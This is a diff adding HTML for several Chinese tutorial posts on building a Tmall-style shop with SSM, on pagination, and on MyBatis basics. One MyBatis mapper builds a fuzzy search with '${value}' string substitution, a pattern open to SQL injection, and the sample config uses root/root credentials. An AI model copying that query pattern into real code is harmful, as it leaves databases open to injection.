@@ -236,6 +236,1614 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/23/天猫项目实战总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/02/23/天猫项目实战总结/" itemprop="url">仿天猫(SSM版)_项目总结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-23T08:15:41+08:00">
+                2019-02-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>断断续续写了有十来天,写这个的目的就是为了熟悉SSM这个框架,很多都参考了how2j的教程,有许多可以改进的地方,后期再维护吧！</p>
+</blockquote>
+<hr>
+<h2 id="项目大概"><a href="#项目大概" class="headerlink" title="项目大概"></a>项目大概</h2><h3 id="表结构"><a href="#表结构" class="headerlink" title="表结构"></a>表结构</h3><p>1.表</p>
+<table>
+<thead>
+<tr>
+<th>表名</th>
+<th>中文含义</th>
+<th>介绍</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Category</td>
+<td>分类表</td>
+<td>存放分类信息</td>
+</tr>
+<tr>
+<td>Property</td>
+<td>属性表</td>
+<td>分类的属性信息</td>
+</tr>
+<tr>
+<td>PropertyValue</td>
+<td>属性值表</td>
+<td>属性值信息</td>
+</tr>
+<tr>
+<td>Product</td>
+<td>产品表</td>
+<td>产品信息</td>
+</tr>
+<tr>
+<td>ProductImage</td>
+<td>产品图片表</td>
+<td>产品图片信息</td>
+</tr>
+<tr>
+<td>Review</td>
+<td>评论表</td>
+<td>产品的评论信息,评论内容</td>
+</tr>
+<tr>
+<td>User</td>
+<td>用户表</td>
+<td>用户信息表,用户账号密码</td>
+</tr>
+<tr>
+<td>Order</td>
+<td>订单表</td>
+<td>订单信息表,含订单号,地址等信息</td>
+</tr>
+<tr>
+<td>OrderItem</td>
+<td>订单项表</td>
+<td>订单项表,含购买种类,数量</td>
+</tr>
+</tbody>
+</table>
+<p>2.表之间的关系            </p>
+<p>正确分析表之间的关系:<br>一个分类对应一个多个产品<br>一个产品对应一个分类        所以分类与产品的关系为<strong>一对多</strong>        </p>
+<p>上面表的一对多的关系:            </p>
+<table>
+<thead>
+<tr>
+<th>一</th>
+<th>多</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Category-分类</td>
+<td>Product-产品</td>
+</tr>
+<tr>
+<td>Category-分类</td>
+<td>Property-属性</td>
+</tr>
+<tr>
+<td>Product-产品</td>
+<td>Review-评价</td>
+</tr>
+<tr>
+<td>User-用户</td>
+<td>Review-评价</td>
+</tr>
+<tr>
+<td>Order-订单</td>
+<td>OrderItem-订单项</td>
+</tr>
+<tr>
+<td>Product-产品</td>
+<td>OrderItem-订单项</td>
+</tr>
+<tr>
+<td>User-用户</td>
+<td>OrderItem-订单项</td>
+</tr>
+<tr>
+<td>User-用户</td>
+<td>Order-订单</td>
+</tr>
+<tr>
+<td>Product-产品</td>
+<td>ProductImage-产品图片</td>
+</tr>
+<tr>
+<td>Property-属性</td>
+<td>PropertyValue-属性值</td>
+</tr>
+<tr>
+<td>Product-产品</td>
+<td>PropertyValue-属性值</td>
+</tr>
+</tbody>
+</table>
+<h3 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h3><p>项目名称tmall_ssm</p>
+<pre><code>Java源代码
+    controller 控制层        
+    interceptor 拦截器            
+    mapper Mapper类
+    pojo 实体类                
+    service Service层            
+    util 工具类
+    comparator 比较类    
+resources
+    mapper 映射文件
+    配置文件
+web目录        
+    css
+    img
+    js
+    Web-INF
+        views
+            admin    后台所用的Jsp文件
+            fore    前台的Jsp文件
+            include    包含的Jsp文件
+
+pom.xml    Maven配置文件            
+</code></pre><h3 id="典型场景"><a href="#典型场景" class="headerlink" title="典型场景"></a>典型场景</h3><p>前台功能:<br>    用户管理<br>        会员注册<br>        会员登陆<br>        退出登陆<br>        登陆验证拦截器<br>    订单管理<br>        查看订单状态<br>        付款<br>        确认收货<br>        评价订单<br>        删除<br>    购物车<br>        查看购物车<br>        添加删除<br>        结算<br>    产品展示<br>        搜索产品<br>        产品详情<br>        展示产品</p>
+<p>后台功能:<br>    分裂,订单,用户,属性等的CURD操作</p>
+<p>其他:<br>    分页功能<br>    事务管理(创建订单时将OrderItem的oid设置为Order表的id值)<br>    产品搜索(使用比较器)                </p>
+<h3 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h3><pre><code>1.MVC设计模式            
+2.MYBATIS逆向工程重构            
+3.模块化的Jsp开发(将每个页面拆分成几个小的Jsp页面)    
+4.后台所有分页页面使用相同的分页机制(admin_page.jsp)            
+</code></pre><p><a href="https://github.com/P0rZ9/tmall_ssm" target="_blank" rel="noopener">源代码</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/12/分页功能详解/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/02/12/分页功能详解/" itemprop="url">分页知识详解</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-12T08:15:41+08:00">
+                2019-02-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>分页使用场景:当取到的数据量到达一定程度时,需要使用分页来进行数据分割</p>
+</blockquote>
+<h4 id="分页分类"><a href="#分页分类" class="headerlink" title="分页分类:"></a>分页分类:</h4><h5 id="a-真分页-物理分页"><a href="#a-真分页-物理分页" class="headerlink" title="a.真分页(物理分页)"></a>a.真分页(物理分页)</h5><pre><code>原理:每次点击下一页时去数据库查询。                
+select * from user where id &gt; 1 limit #{param1}, #{param2}    
+优点:不会造成内存溢出    
+缺点:翻页速度较慢    
+</code></pre><h5 id="b-假分页-逻辑分页"><a href="#b-假分页-逻辑分页" class="headerlink" title="b.假分页(逻辑分页)"></a>b.假分页(逻辑分页)</h5><pre><code>原理:一次将所有数据取出放入内存中,每次查询直在内存中取出数据。    优点:分页速度较快            
+缺点:可能造成内存溢出                        
+</code></pre><p>假分页容易实现,即准备一个集合保存从数据库中取出所有数据,根据当前码数,取出对应范围的数据,我们这里主要学习物理分页。            </p>
+<h4 id="实现简单物理分页"><a href="#实现简单物理分页" class="headerlink" title="实现简单物理分页"></a>实现简单物理分页</h4><p>1.准备一个Page工具类:    </p>
+<pre><code>public class Page {
+
+  int start;
+  int count;
+  int total;
+
+  //构造方法
+  public Page(int start,int count){
+      super();
+      this.start = start;
+      this.count = count;
+  }
+
+  //计算得到尾页
+  public int getLast(){
+      int last;
+      //假设total=50  count=5
+      if(total % count == 0)
+          //最后一页开头为45
+         last = total - count;
+      else
+          //不整除 最后一页开头为50
+          last = total - total % count;
+
+      last = last &lt; 0 ? 0 : last;
+      return last;
+  }
+
+  //是否有上一页 下一页
+  public boolean isHasPreviouse(){
+      if (start == 0)
+          return false;
+      return true;
+  }
+  public boolean isHasNext(){
+      if(getLast() == 0)
+          return false;
+      return true;
+  }
+
+  //计算得到总页数
+  public int getTotalPage(){
+      int totalPage;
+
+      if(total % count == 0)
+          totalPage = total / count;
+      else
+          totalPage = total / count + 1;
+      if(totalPage == 0)
+          totalPage = 1;
+
+      return totalPage;
+  }
+
+/* getter and setter */
+}
+</code></pre><p>前台设计:</p>
+<pre><code>&lt;ul class=&quot;pagination&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#&quot;&gt;&amp;laquo;&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#&quot;&gt;1&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#&quot;&gt;2&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#&quot;&gt;3&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#&quot;&gt;4&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#&quot;&gt;5&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#&quot;&gt;&amp;raquo;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-12.10.39.23-image.png" alt="2019-02-12.10.39.23-image.png"></p>
+<p>前台分页设计:</p>
+<pre><code>&lt;ul class=&quot;pagination&quot;&gt;
+    &lt;li&gt;&lt;a href=&quot;?page.start=0&quot;&gt;&lt;span&gt;«&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+    &lt;li&gt;&lt;a href=&quot;?page.start=${page.start-page.count}&quot;&gt;&lt;span&gt;‹&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+
+    &lt;c:forEach begin=&quot;0&quot; end=&quot;${page.totalPage-1}&quot; varStatus=&quot;status&quot;&gt;
+    &lt;li&gt;
+        &lt;a href=&quot;?page.start=${status.index*page.count}&quot; class=&quot;current&quot;&gt;${status.count}&lt;/a&gt;
+    &lt;/li&gt;
+    &lt;/c:forEach&gt;
+
+    &lt;li&gt;&lt;a href=&quot;?page.start=${page.start+page.count}&quot;&gt;&lt;span&gt;›&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+    &lt;li&gt;&lt;a href=&quot;?page.start=${page.last}&quot;&gt;&lt;span&gt;»&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</code></pre><h4 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h4><p>a.没有边界判断,即在首页仍然可以点击前一页,不符合逻辑<br>b.会显示所有的分页,如果totalPage有100多页,则会全部显示出来,影响美观            </p>
+<h4 id="改良版本"><a href="#改良版本" class="headerlink" title="改良版本"></a>改良版本</h4><p>1.写好头与尾:</p>
+<pre><code>&lt;nav class=&quot;pageDIV&quot;&gt;
+  &lt;ul class=&quot;pagination&quot;&gt;
+  .....
+  &lt;/ul&gt;
+&lt;/nav&gt;
+</code></pre><p>2.对<code>« ‹</code>增加边值判断        </p>
+<pre><code>&lt;li &lt;c:if test=&quot;${!page.hasPrevious}&quot;&gt;class=&quot;disabled&quot;&lt;/c:if&gt;&gt;
+     &lt;a href=&quot;?page.start=0&quot;&gt;
+         &lt;span&gt;
+             «
+         &lt;/span&gt;
+     &lt;/a&gt;
+ &lt;/li&gt;
+
+ &lt;li &lt;c:if test=&quot;${!page.hasPrevious}&quot;&gt;class=&quot;disabled&quot;&lt;/c:if&gt;&gt;
+     &lt;a href=&quot;?page.start=${page.start-page.count}&quot;&gt;
+         &lt;span&gt;
+             ‹
+         &lt;/span&gt;
+     &lt;/a&gt;
+ &lt;/li&gt;
+</code></pre><p>获取JavaBean的属性,只需要.符号就可以操作。<code>${hero.name}</code>就会自动调用其getName()方法。如果属性为boolean类型,就会自动调用isXXX方法。<br>所以使用page.hasPrevious就会自动调用isHasPrevious()方法。<br>并用js对其禁止:</p>
+<pre><code>&lt;script&gt;
+  $(function () {
+      $(&quot;ui.pagination li.disabled a&quot;).click(function () {
+          return false;
+      });
+  });
+&lt;/script&gt;
+</code></pre><p>3.中间页码的编写    </p>
+<pre><code>&lt;c:forEach begin=&quot;0&quot; end=&quot;${page.totalPage-1}&quot; varStatus=&quot;status&quot;&gt;
+    &lt;c:if test=&quot;${status.count*page.count-page.start&lt;=30 &amp;&amp; status.count*page.count-page.start&gt;=-10}&quot;&gt;
+        &lt;li &lt;c:if test=&quot;${status.index*page.count==page.start}&quot;&gt;class=&quot;disabled&quot;&lt;/c:if&gt;&gt;
+            &lt;a href=&quot;?page.start=${status.index*page.count}&quot;
+               &lt;c:if test=&quot;${status.index*page.count==page.start}&quot;&gt;class=&quot;current&quot;&lt;/c:if&gt;
+            &gt;${status.count}&lt;/a&gt;
+        &lt;/li&gt;
+    &lt;/c:if&gt;
+&lt;/c:forEach&gt;
+</code></pre><p>从0循环到<code>page.totalPage-1</code>,varStatus相当于循环变量<br>status.count是从1开始遍历<br>status.index是从0开始遍历<br>要求:显示页码的前2个与后2个即可,即在第3页时,显示<code>1,2,3,4,5</code>的页码<br>测试条件:-10&lt;当前页*每页显示数目-当前页开始编号&lt;=30<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-12.13.29.28-image.png" alt="2019-02-12.13.29.28-image.png"></p>
+<p>4.后台实现分页<br>使用上面的Page工具类,我们在dao层定义一个<code>List&lt;User&gt; list(int start, int count);</code>方法,经过Mapper映射</p>
+<pre><code>&lt;select id=&quot;list&quot; resultMap=&quot;students&quot;&gt;
+    select * from user order by user_id desc limit #{param1}, #{param2}
+&lt;/select&gt;
+</code></pre><p>然后在controller中:</p>
+<pre><code>// 获取分页参数
+int start = 0;
+int count = 10;
+
+try {
+    start = Integer.parseInt(request.getParameter(&quot;page.start&quot;));
+    count = Integer.parseInt(request.getParameter(&quot;page.count&quot;));
+} catch (Exception e) {
+}
+Page page = new Page(start, count);
+
+List&lt;User&gt; users = userService.list(page.getStart(), page.getCount());
+int total = userService.getTotal();
+page.setTotal(total);
+request.setAttribute(&quot;users&quot;, users);
+request.setAttribute(&quot;page&quot;, page);
+
+return &quot;listUser&quot;;
+</code></pre><p>即可完成分页功能        </p>
+<h4 id="SSM项目中的分页"><a href="#SSM项目中的分页" class="headerlink" title="SSM项目中的分页"></a>SSM项目中的分页</h4><p>在SSM项目中,我们可以使用MyBatis的一款分页插件<br><a href="https://github.com/pagehelper/Mybatis-PageHelper" target="_blank" rel="noopener">PageHelper</a><br><strong>使用方法:</strong><br>1.pom.xml添加依赖包        </p>
+<pre><code>&lt;!-- pageHelper --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt;
+    &lt;artifactId&gt;pagehelper&lt;/artifactId&gt;
+    &lt;version&gt;5.1.2-beta&lt;/version&gt;
+&lt;/dependency&gt;
+
+&lt;!--jsqlparser--&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;com.github.jsqlparser&lt;/groupId&gt;
+    &lt;artifactId&gt;jsqlparser&lt;/artifactId&gt;
+    &lt;version&gt;1.0&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre><p>2.spring-mybatis.xml配置文件</p>
+<pre><code>&lt;!-- 配置SqlSessionFactory对象 --&gt;
+&lt;bean&gt;
+......
+    &lt;property name=&quot;plugins&quot;&gt;
+        &lt;array&gt;
+            &lt;bean class=&quot;com.github.pagehelper.PageInterceptor&quot;&gt;
+                &lt;property name=&quot;properties&quot;&gt;
+                    &lt;!-- config params as the following --&gt;
+                    &lt;value&gt;
+                        helperDialect=mysql
+                    &lt;/value&gt;
+                &lt;/property&gt;
+            &lt;/bean&gt;
+        &lt;/array&gt;
+    &lt;/property&gt;
+&lt;/bean&gt;
+</code></pre><p>3.UserController:</p>
+<pre><code>PageHelper.offsetPage(page.getStart(),page.getCount());
+List&lt;User&gt; users = userService.list();
+int total = (int) new PageInfo&lt;&gt;(users).getTotal();
+page.setTotal(total);
+modelMap.addAttribute(&quot;page&quot;,page);
+modelMap.addAttribute(&quot;users&quot;,users);
+</code></pre><p>需要注意的是:<code>PageHelper.offsetPage(page.getStart(),page.getCount);只对该语句以后的第一个查询语句得到的数据进行分页</code>,所以这句话应该放在得到users前面。                </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/25/ssm整合/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/25/ssm整合/" itemprop="url">ssm整合</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-25T08:15:41+08:00">
+                2019-01-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>模仿网上的教程,使用ssm完成一个对用户进行增删改查的小demo</p>
+</blockquote>
+<hr>
+<h3 id="使用Maven构建SSM项目"><a href="#使用Maven构建SSM项目" class="headerlink" title="使用Maven构建SSM项目"></a>使用Maven构建SSM项目</h3><pre><code>1.导入 jar 包(如果使用 maven 则配置 pom.xml)
+2.配置 web.xml 文件
+3.配置 spring.xml springMVC.xml myBatis.xml
+4.配置资源文件，database.properties，log4j.properties 等等
+5.设计 entity 实体类
+6.编写 DAO 层接口和 Mapper.xml
+7.编写 service 业务层
+8.编写 cotroller 控制器
+9.视图代码：前台 jsp 页面
+
+1.在pom.xml项目中添加SSM项目需要的jar包    
+2.配置Spring mvc的相关配置信息(自动扫描cn.test包下带有注解的类)            
+3.通过xml方式配置日志与数据库
+4.创建实体类User Dao类UserDao 业务类UserService
+5.创建控制器UserController并返回数据到视图层`view/*.jsp`
+</code></pre><p>测试界面:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-24.10.42.18-image.png" alt="2019-01-24.10.42.18-image.png"></p>
+<p>项目结构:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-24.20.17.58-image.png" alt="2019-01-24.20.17.58-image.png"></p>
+<h3 id="学生管理系统-SSM版"><a href="#学生管理系统-SSM版" class="headerlink" title="学生管理系统(SSM版)"></a>学生管理系统(SSM版)</h3><p>ssm框架基本结构图：<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-25.22.17.27-image.png" alt="2019-01-25.22.17.27-image.png"></p>
+<p>用户访问SSM流程图:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-25.21.00.51-image.png" alt="2019-01-25.21.00.51-image.png"></p>
+<p><a href="https://github.com/P0rZ9/SSM" target="_blank" rel="noopener">源代码</a>    </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/23/Mybatis/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/23/Mybatis/" itemprop="url">ssm基础之MyBatis</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-23T09:15:41+08:00">
+                2019-01-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>学习了MYBATIS,记录一波    </p>
+</blockquote>
+<h3 id="Mybatis简介"><a href="#Mybatis简介" class="headerlink" title="Mybatis简介"></a>Mybatis简介</h3><blockquote>
+<p>MyBatis 本是apache的一个开源项目iBatis, 2010年这个项目由apache software foundation 迁移到了google code，并且改名为MyBatis，是一个基于Java的持久层框架。</p>
+</blockquote>
+<p><strong>持久层</strong>： 可以将业务数据存储到磁盘，具备长期存储能力，只要磁盘不损坏，在断电或者其他情况下，重新开启系统仍然可以读取到这些数据。<br><strong>优点</strong>： 可以使用巨大的磁盘空间存储相当量的数据，并且很廉价<br><strong>缺点</strong>：慢（相对于内存而言）</p>
+<p><strong>为什么使用Mybatis</strong>        </p>
+<blockquote>
+<p>传统JDBC中,除了自己提供sql语句外,还必须操作Connection,Statement,ResultSet,非常繁琐。使用Mybatis后,只需要提供sql语句即可,我们只需要重点关注增删改查这些操作层面上。并且Mybatis支持使用简单的XML或注解来配置和映射原生信息,将接口和Java对象映射为数据库中的记录。            </p>
+</blockquote>
+<p>Mybatis运行程序原理图:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-22.20.51.18-image.png" alt="2019-01-22.20.51.18-image.png"></p>
+<pre><code>程序执行顺序:
+1.应用程序找Mybatis要数据            
+2.Mybatis从数据库找来数据        
+    2.1 通过mybatis-config.xml定位数据库        
+    2.2 通过User.xml执行对应的select语句        
+    2.3 基于User.xml把返回的数据库记录封装在User对象中
+    2.4 将多个User对象封装在一个User集合中        
+3.返回一个User集合
+</code></pre><h3 id="第一个Mybatis程序"><a href="#第一个Mybatis程序" class="headerlink" title="第一个Mybatis程序"></a>第一个Mybatis程序</h3><p>1.Maven pom.xml    </p>
+<pre><code>&lt;dependency&gt;
+    &lt;groupId&gt;mysql&lt;/groupId&gt;
+    &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;
+    &lt;version&gt;5.1.43&lt;/version&gt;
+&lt;/dependency&gt;
+
+&lt;!-- Mybatis依赖 --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;
+    &lt;artifactId&gt;mybatis&lt;/artifactId&gt;
+    &lt;version&gt;3.4.4&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre><p>2.Mybatis 配置文件 mybatis-config.xml<br>作用主要就是提供连接数据库用的驱动,数据名称,编码方式,账号密码等</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
+&lt;!DOCTYPE configuration
+        PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;
+        &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;
+
+&lt;configuration&gt;
+
+
+    &lt;typeAliases&gt;
+        &lt;package name=&quot;com.test.pojo&quot;/&gt;
+    &lt;/typeAliases&gt;
+
+    &lt;environments default=&quot;development&quot;&gt;
+        &lt;environment id=&quot;development&quot;&gt;
+            &lt;transactionManager type=&quot;JDBC&quot;/&gt;
+            &lt;dataSource type=&quot;POOLED&quot;&gt;
+                &lt;property name=&quot;driver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt;
+                &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/mybatis?characterEncoding=UTF-8&quot;/&gt;
+                &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt;
+                &lt;property name=&quot;password&quot; value=&quot;root&quot;/&gt;
+            &lt;/dataSource&gt;
+        &lt;/environment&gt;
+    &lt;/environments&gt;
+    &lt;mappers&gt;
+        &lt;mapper resource=&quot;com/test/pojo/User.xml&quot;/&gt;
+    &lt;/mappers&gt;
+
+&lt;/configuration&gt;
+</code></pre><p>3.配置文件User.xml</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE mapper
+        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;
+        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;
+
+&lt;mapper namespace=&quot;com.test.pojo&quot;&gt;
+    &lt;select id=&quot;listUser&quot; resultType=&quot;User&quot;&gt;
+            select * from user
+    &lt;/select&gt;
+
+    &lt;insert id=&quot;addUser&quot; parameterType=&quot;User&quot;&gt;
+        insert into user ( name ) values (#{name})
+    &lt;/insert&gt;
+
+    &lt;delete id=&quot;delUser&quot; parameterType=&quot;User&quot;&gt;
+        delete from user where id = #{id}
+    &lt;/delete&gt;
+
+    &lt;select id=&quot;getUser&quot; parameterType=&quot;_int&quot; resultType=&quot;User&quot;&gt;
+        select * from user where id=#{id}
+    &lt;/select&gt;
+
+    &lt;update id=&quot;updateUser&quot; parameterType=&quot;User&quot; &gt;
+        update user set name = #{name} where id=#{id}
+    &lt;/update&gt;
+
+    &lt;!--模糊查询--&gt;
+    &lt;select id=&quot;findUserByName&quot; parameterType=&quot;String&quot; resultType=&quot;User&quot;&gt;
+        select * from user where name like &apos;%${value}%&apos;
+    &lt;/select&gt;
+
+
+&lt;/mapper&gt;
+</code></pre><p>由于在主配置文件里配置了<code>&lt;typeAliases&gt;</code>别名,所以在这里的resultType可以直接写User,不用写全名pojo.User<br>namespace属性就是对SQL语句进行分类管理,实现不同业务的SQL隔离。            </p>
+<p>4.测试类  TestMybatis.java    </p>
+<pre><code>TestMybatis.java            
+package com.test;
+
+import java.io.IOException;
+import java.io.InputStream;
+import java.util.List;
+
+import org.apache.ibatis.io.Resources;
+import org.apache.ibatis.session.SqlSession;
+import org.apache.ibatis.session.SqlSessionFactory;
+import org.apache.ibatis.session.SqlSessionFactoryBuilder;
+
+import com.test.pojo.User;
+
+public class TestMybatis {
+
+public static void main(String[] args) throws IOException {
+    String resource = &quot;mybatis-config.xml&quot;;
+    InputStream inputStream = Resources.getResourceAsStream(resource);
+    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);
+    SqlSession session=sqlSessionFactory.openSession();
+
+
+    //插入用户
+    User user1 = new User();
+    user1.setName(&quot;test1&quot;);
+    session.insert(&quot;addUser&quot;,user1);
+
+   //修改用户
+    User user2 = session.selectOne(&quot;getUser&quot;,5);
+    user2.setName(&quot;test_after&quot;);
+    session.update(&quot;updateUser&quot;,user2);
+
+    //删除用户
+    User user3 = new User();
+    user3.setId(3);
+    session.delete(&quot;delUser&quot;,user3);
+
+    //获取用户
+    User user4 = session.selectOne(&quot;getUser&quot;,5);
+    System.out.println(user4.getName());
+
+    //模糊查询
+    List&lt;User&gt; users = session.selectList(&quot;findUserByName&quot;,&quot;te&quot;);
+    for(User user : users){
+        System.out.println(user.getId()+&quot;:&quot;+user.getName());
+    }
+
+    //获取全部用户
+    listAll(session);
+    session.commit();
+    session.close();
+}
+
+private static void listAll(SqlSession session){
+
+    //列出全部用户
+    List&lt;User&gt; users=session.selectList(&quot;listUser&quot;);
+    for (User user : users) {
+        System.out.println(user.getName());
+    }
+}
+}
+</code></pre><p>xml文件几个概念:<br>parameterType：指定输入参数类型,可为基本数据类型(int float)与包装数据类型(String Interger)以及用户编写的JavaBean类<br>resultType: 指定从数据库返回的信息对应的Java数据类型。</p>
